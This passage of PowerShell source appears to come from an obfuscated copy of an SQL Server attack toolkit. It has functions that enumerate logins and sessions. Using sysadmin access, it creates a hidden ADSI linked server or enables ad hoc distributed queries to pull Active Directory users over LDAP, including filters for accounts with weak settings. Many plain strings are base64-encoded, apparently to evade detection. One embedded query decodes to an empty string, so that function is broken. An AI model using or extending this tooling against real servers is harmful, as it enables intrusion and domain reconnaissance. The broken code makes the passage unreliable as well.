        $TblCredentials = $TblCredentials + $TblResults
    }
    End
    {
        $TblCredentials
    }
}
Function  Get-SQLServerLogin
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Principal name to filter for.')]
        [string]$PrincipalName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblLogins = New-Object -TypeName System.Data.DataTable
        $null = $TblLogins.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblLogins.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblLogins.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwASQBkAA=='))))
        $null = $TblLogins.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQA='))))
        $null = $TblLogins.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAUwBpAGQA'))))
        $null = $TblLogins.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAVAB5AHAAZQA='))))
        $null = $TblLogins.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUARABhAHQAZQA='))))
        $null = $TblLogins.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEwAbwBjAGsAZQBkAA=='))))
        if($PrincipalName)
        {
            $PrincipalNameFilter = " and name like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $Query = "  USE master;
            SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],principal_id as [PrincipalId],
            name as [PrincipalName],
            sid as [PrincipalSid],
            type_desc as [PrincipalType],
            create_date as [CreateDate],
            LOGINPROPERTY ( name , 'IsLocked' ) as [IsLocked]
            FROM [sys].[server_principals]
            WHERE type = 'S' or type = 'U' or type = 'C'
        $PrincipalNameFilter"
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $TblResults |
        % -Process {
            $NewSid = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
            if ($NewSid.length -le 10)
            {
                $Sid = [Convert]::ToInt32($NewSid,16)
            }
            else
            {
                $Sid = $NewSid
            }
            $null = $TblLogins.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                [string]$_.PrincipalId,
                [string]$_.PrincipalName,
                $Sid,
                [string]$_.PrincipalType,
                $_.CreateDate,
            [string]$_.IsLocked)
        }
    }
    End
    {
        $TblLogins
    }
}
Function  Get-SQLSession
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'PrincipalName.')]
        [string]$PrincipalName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblSessions = New-Object -TypeName System.Data.DataTable
        $null = $TblSessions.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblSessions.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblSessions.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAUwBpAGQA'))))
        $null = $TblSessions.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQA='))))
        $null = $TblSessions.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwByAGkAZwBpAG4AYQBsAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUA'))))
        $null = $TblSessions.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBJAGQA'))))
        $null = $TblSessions.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBTAHQAYQByAHQAVABpAG0AZQA='))))
        $null = $TblSessions.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBMAG8AZwBpAG4AVABpAG0AZQA='))))
        $null = $TblSessions.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBTAHQAYQB0AHUAcwA='))))
        if($PrincipalName)
        {
            $PrincipalNameFilter = " and login_name like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $Query = "  USE master;
            SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            security_id as [PrincipalSid],
            login_name as [PrincipalName],
            original_login_name as [OriginalPrincipalName],
            session_id as [SessionId],
            last_request_start_time as [SessionStartTime],
            login_time as [SessionLoginTime],
            status as [SessionStatus]
            FROM    [sys].[dm_exec_sessions]
            ORDER BY status
        $PrincipalNameFilter"
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $TblResults |
        % -Process {
            $NewSid = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
            if ($NewSid.length -le 10)
            {
                $Sid = [Convert]::ToInt32($NewSid,16)
            }
            else
            {
                $Sid = $NewSid
            }
            $null = $TblSessions.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                $Sid,
                [string]$_.PrincipalName,
                [string]$_.OriginalPrincipalName,
                [string]$_.SessionId,
                [string]$_.SessionStartTime,
                [string]$_.SessionLoginTime,
            [string]$_.SessionStatus)
        }
    }
    End
    {
        $TblSessions
    }
}
Function  Get-SQLOleDbProvder
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 2,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblResults = New-Object -TypeName System.Data.DataTable
        $TblProviders = New-Object -TypeName System.Data.DataTable
        $null = $TblProviders.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))) 
        $null = $TblProviders.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA==')))) 
        $null = $TblProviders.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQByAE4AYQBtAGUA')))) 
        $null = $TblProviders.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQByAEQAZQBzAGMAcgBpAHAAdABpAG8AbgA='))))
        $null = $TblProviders.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQByAFAAYQByAHMAZQBOAGEAbQBlAA=='))))
        $null = $TblProviders.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AEkAbgBQAHIAbwBjAGUAcwBzAA=='))))
        $null = $TblProviders.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBsAGwAbwB3AEEAZABIAG8AYwBBAGMAYwBlAHMAcwA='))))
        $null = $TblProviders.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBQAGEAcgBhAG0AZQB0AGUAcgBzAA==')))) 
        $null = $TblProviders.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGQAZQB4AEEAcwBBAGMAYwBlAHMAcwBQAGEAdABoAA==')))) 
        $null = $TblProviders.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAHYAZQBsAFoAZQByAG8ATwBuAGwAeQA=')))) 
        $null = $TblProviders.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHMAdABlAGQAUQB1AGUAcgBpAGUAcwA=')))) 
        $null = $TblProviders.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AVAByAGEAbgBzAGEAYwB0AGUAZABVAHAAZABhAHQAZQBzAA==')))) 
        $null = $TblProviders.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBxAGwAUwBlAHIAdgBlAHIATABJAEsARQA='))))
        $PipelineItems = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        $PipelineItems = $PipelineItems + $ProvideInstance
    }
    Process
    {
        $PipelineItems = $PipelineItems + $_
    }
    End
    {
        $MyScriptBlock = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
                $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
            }
            if($TestConnection)
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Failed."
                }
                return
            }
            $IsSysadmin = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
            if($IsSysadmin -eq "No")
            {
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message "$Instance : This command requires sysadmin privileges. Exiting."  
                }              
                return
            }else{
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message "$Instance : You have sysadmin privileges."
                    Write-Verbose -Message "$Instance : Grabbing list of providers."
                }
            }            
            $Query = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('')))
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $TblResults |
            % -Process {
                $null = $TblProviders.Rows.Add(
                    $ComputerName,
                    $Instance,
                    $_.ProviderName,
                    $_.ProviderDescription,
                    $_.ProviderParseName,
                    $_.AllowInProcess,
                    $_.DisallowAdHocAccess,
                    $_.DynamicParameters,
                    $_.IndexAsAccessPath,
                    $_.LevelZeroOnly,
                    $_.NestedQueries,
                    $_.NonTransactedUpdates,
                    $_.SqlServerLIKE
                )
            }
        }
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return $TblProviders
    }
}
Function  Get-SQLDomainObject
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.  This is the number of instance to process at a time')]
        [int]$Threads = 2,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Ldap path. domain/dc=domain,dc=local')]
        [string]$LdapPath,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Ldap filter. Example: (&(objectCategory=Person)(objectClass=user))')]
        [string]$LdapFilter,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Ldap fields. Example: samaccountname,name,admincount,whencreated,whenchanged,adspath')]
        [string]$LdapFields,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblResults = New-Object -TypeName System.Data.DataTable
        $TblDomainObjects = New-Object -TypeName System.Data.DataTable         
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $DomainName = $ServerInfo.DomainName
        $IsSysadmin = $ServerInfo.IsSysadmin
        $ServiceAccount = $ServerInfo.ServiceAccount
        $SQLServerMajorVersion = $ServerInfo.SQLServerMajorVersion
        $SQLServerEdition = $ServerInfo.SQLServerEdition
        $SQLServerVersionNumber = $ServerInfo.SQLServerVersionNumber
        $SQLCurrentLogin = $ServerInfo.Currentlogin
        If (-not($SuppressVerbose)){
            Write-Verbose -Message "$instance : Login: $SQLCurrentLogin"
            Write-Verbose -Message "$Instance : Domain: $DomainName"
            Write-Verbose -Message "$Instance : Version: SQL Server $SQLServerMajorVersion $SQLServerEdition ($SQLServerVersionNumber)"
        }
        if($IsSysadmin -eq "No")
        {
            If (-not($SuppressVerbose)){
                Write-Verbose -Message "$Instance : Sysadmin: No"
                Write-Verbose -Message "$Instance : This command requires sysadmin privileges. Exiting."  
            }          
            return
        }else{
            If (-not($SuppressVerbose)){
                Write-Verbose -Message "$Instance : Sysadmin: Yes"
            }
        }          
        if ($SQLCurrentLogin -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBcACoA'))))
        {
            if(($UseAdHoc) -or ($LinkPassword)){
            }else{
                Write-Verbose -Message "$Instance : A SQL Login with sysadmin privileges cannot execute ASDI queries through a linked server by itself."
                Write-Verbose -Message "$Instance : Try one of the following:"
                Write-Verbose -Message "$Instance :  - Run the command again with the -UseAdHoc flag "
                Write-Verbose -Message "$Instance :  - Run the command again and provide -LinkUser and -LinkPassword"
                return
            }
        }
        if(-not $LdapPath ){
            $LdapPath = $DomainName
        }
        $CheckEnabled = Get-SQLOleDbProvder -Instance $Instance -Username $Username -Password $Password -SuppressVerbose | Where ProviderName -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAHMARABTAE8ATwBiAGoAZQBjAHQA'))) | select AllowInProcess -ExpandProperty AllowInProcess
        if ($CheckEnabled -ne 1){
            Write-Verbose -Message "$Instance : ADsDSOObject provider allowed to run in process: No"
            Write-Verbose -Message "$Instance : The ADsDSOObject provider is not allowed to run in process. Stopping operation."
            return
        }else{
            Write-Verbose -Message "$Instance : ADsDSOObject provider allowed to run in process: Yes"
        }
        if($UseAdHoc){
            If (-not($SuppressVerbose)){                
                if ($SQLCurrentLogin -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBcACoA')))){
                    Write-Verbose -Message "$Instance : Executing in AdHoc mode using OpenRowSet as '$SQLCurrentLogin'."
                }else{
                    if(-not $LinkUsername){
                        Write-Verbose -Message "$Instance : Executing in AdHoc mode using OpenRowSet as the SQL Server service account ($ServiceAccount)."
                    }else{
                        Write-Verbose -Message "$Instance : Executing in AdHoc mode using OpenRowSet as '$LinkUsername'."
                    }
                }
            }
        }else{
            If (-not($SuppressVerbose)){
                Write-Verbose -Message "$Instance : Executing in Link mode using OpenQuery."
            }
        }
        if(-not $UseAdHoc){
            $RandomLinkName = (-join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_}))                                
            If (-not($SuppressVerbose)){
                Write-Verbose -Message "$Instance : Creating ADSI SQL Server link named $RandomLinkName."
            }
            $QueryCreateLink = "
            
            -- Create SQL Server link to ADSI
            IF (SELECT count(*) FROM master..sysservers WHERE srvname = '$RandomLinkName') = 0
	            EXEC master.dbo.sp_addlinkedserver @server = N'$RandomLinkName', 
	            @srvproduct=N'Active Directory Service Interfaces', 
	            @provider=N'ADSDSOObject', 
	            @datasrc=N'adsdatasource'
                
            ELSE
	            SELECT 'The target SQL Server link already exists.'"
            $QueryCreateLinkResults = Get-SQLQuery -Instance $Instance -Query $QueryCreateLink -Username $Username -Password $Password -Credential $Credential -ReturnError
            if(($LinkUsername) -and ($LinkPassword)){
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message "$Instance : Associating login '$LinkUsername' with ADSI SQL Server link named $RandomLinkName."
                }
                $QueryAssociateLogin = "

                EXEC sp_addlinkedsrvlogin 
                @rmtsrvname=N'$RandomLinkName',
                @useself=N'False',
                @locallogin=NULL,
                @rmtuser=N'$LinkUsername',
                @rmtpassword=N'$LinkPassword'"                                           
            }else{
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message "$Instance : Associating '$SQLCurrentLogin' with ADSI SQL Server link named $RandomLinkName."
                }
                $QueryAssociateLogin = "
                -- Current User Context
                -- Notes: testing tbd, sql login (non sysadmin), sql login (sysadmin), windows login (nonsysadmin), windows login (sysadmin), - test passthru and provided creds 
                EXEC sp_addlinkedsrvlogin 
                @rmtsrvname=N'$RandomLinkName',
                @useself=N'True',
                @locallogin=NULL,
                @rmtuser=NULL,
                @rmtpassword=NULL"
            }                                
            Get-SQLQuery -Instance $Instance -Query $QueryAssociateLogin -Username $Username -Password $Password -Credential $Credential -SuppressVerbose 
        }        
        if($UseAdHoc){
            $Original_State_ShowAdv = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIAB2AGEAbAB1AGUAXwBpAG4AXwB1AHMAZQAgAEYAUgBPAE0AIABtAGEAcwB0AGUAcgAuAHMAeQBzAC4AYwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgBzACAAVwBIAEUAUgBFACAAbgBhAG0AZQAgAGwAaQBrAGUAIAAnAHMAaABvAHcAIABhAGQAdgBhAG4AYwBlAGQAIABvAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select value_in_use -ExpandProperty value_in_use
            $Original_State_AdHocQuery = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIAB2AGEAbAB1AGUAXwBpAG4AXwB1AHMAZQAgAEYAUgBPAE0AIABtAGEAcwB0AGUAcgAuAHMAeQBzAC4AYwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgBzACAAVwBIAEUAUgBFACAAbgBhAG0AZQAgAGwAaQBrAGUAIAAnAEEAZAAgAEgAbwBjACAARABpAHMAdAByAGkAYgB1AHQAZQBkACAAUQB1AGUAcgBpAGUAcwAnAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select value_in_use -ExpandProperty value_in_use
            if($Original_State_ShowAdv -eq 0){
                Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose                  
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message "$Instance : Enabling 'Show Advanced Options'"
                }
            }else{
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message "$Instance : 'Show Advanced Options' is already enabled"
                }
            }
            if($Original_State_AdHocQuery -eq 0){               
                Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAEEAZAAgAEgAbwBjACAARABpAHMAdAByAGkAYgB1AHQAZQBkACAAUQB1AGUAcgBpAGUAcwAnACwAMQA7AFIARQBDAE8ATgBGAEkARwBVAFIARQA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose                
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message "$Instance : Enabling 'Ad Hoc Distributed Queries'"
                }
            }else{
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message "$Instance : 'Ad Hoc Distributed Queries' are already enabled"
                }
            }
        }
        if($UseAdHoc){
            if(($LinkUsername) -and ($LinkPassword)){
                $AdHocAuth = "User ID=$LinkUsername; Password=$LinkPassword;"                
            }else{
                $AdHocAuth = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHMAZABhAHQAYQBzAG8AdQByAGMAZQA='))) 
            }
            $Query = "
            -- Run with credential in syntax option 1 - works as sa
            SELECT *
            FROM OPENROWSET('ADSDSOOBJECT','$AdHocAuth',
            '<LDAP://$LdapPath>;$LdapFilter;$LdapFields;subtree')"
        }else{
            $Query  = "SELECT * FROM OpenQuery($RandomLinkName,'<LDAP://$LdapPath>;$LdapFilter;$LdapFields;subtree')"                 
        }                        
        If (-not($SuppressVerbose)){
            Write-Verbose -Message "$Instance : LDAP query against logon server using ADSI OLEDB started..."
        }        
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential
        $TblDomainObjects += $TblResults         
        if(-not $UseAdHoc){
            If (-not($SuppressVerbose)){
                Write-Verbose -Message "$Instance : Removing ADSI SQL Server link named $RandomLinkName"
            }
            $RemoveLinkQuery = "EXEC master.dbo.sp_dropserver @server=N'$RandomLinkName', @droplogins='droplogins'"
            $RemoveLinkQueryResults = Get-SQLQuery -Instance $Instance -Query $RemoveLinkQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        }
        if($UseAdHoc){
            If (-not($SuppressVerbose)){
                Write-Verbose -Message "$Instance : Restoring AdHoc settings if needed."
            }
            Get-SQLQuery -Instance $Instance -Query "sp_configure 'Ad Hoc Distributed Queries',$Original_State_AdHocQuery;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose        
            Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',$Original_State_ShowAdv;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose              
        }
        If (-not($SuppressVerbose)){
            Write-Verbose -Message "$Instance : LDAP query against logon server using ADSI OLEDB complete."
        } 
    }
    End
    {
        $RecordCount = $TblDomainObjects.Row.count
        If (-not($SuppressVerbose)){
            Write-Verbose -Message "$Instance : $RecordCount records were found."
        } 
        return $TblDomainObjects
    }
}
Function  Get-SQLDomainUser
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Filter users based on state or property settings.')]
        [ValidateSet("All","Enabled","Disabled","Locked","PwNeverExpires","PwNotRequired","PreAuthNotRequired","SmartCardRequired","TrustedForDelegation","TrustedToAuthForDelegation","PwStoredRevEnc")]
        [String]$UserState,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain user to filter for.')]
        [string]$FilterUser,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Only list the users who have not changed their password in the number of days provided.')]
        [Int]$PwLastSet,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if((-not $FilterUser)){
            $FilterUser = '*'
        }
        if((-not $PwLastSet)){
            $PwLastSetFilter = ""
        }else{
            $DesiredTimeStamp = (Get-Date).AddDays(-$PwLastSet).ToFileTime()
            $PwLastSetFilter = "(!pwdLastSet>=$DesiredTimeStamp)"
        }
        switch ($UserState)
        {
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA')))                         {$UserStateFilter = ""} 
